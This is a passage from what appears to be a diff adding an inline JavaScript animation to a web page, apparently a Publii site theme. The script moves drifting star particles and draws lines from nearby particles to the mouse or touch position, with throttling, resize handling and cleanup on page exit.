+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
